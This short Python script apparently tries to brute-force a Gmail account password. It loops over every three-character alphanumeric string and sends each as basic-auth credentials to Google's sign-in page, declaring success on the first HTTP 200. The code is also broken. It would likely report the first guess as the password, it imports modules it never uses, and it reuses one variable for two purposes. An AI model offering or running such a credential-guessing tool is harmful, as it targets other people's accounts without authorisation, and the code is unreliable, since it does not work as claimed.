import requests
import urllib.request
import urllib.parse
import email
import gmail
import itertools
import re
import string
from getpass import getpass
from email.mime.text import MIMEText

gmail = input("Enter your gmail adress: ")
password = list(itertools.product(string.ascii_letters + string.digits, repeat=3))
for i in password:
    password = ''.join(i)
    response = requests.get("https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin", auth=(gmail, password))
    if response.status_code == 200:
        print("Password is: " + password)
        break
    else:
        continue

    

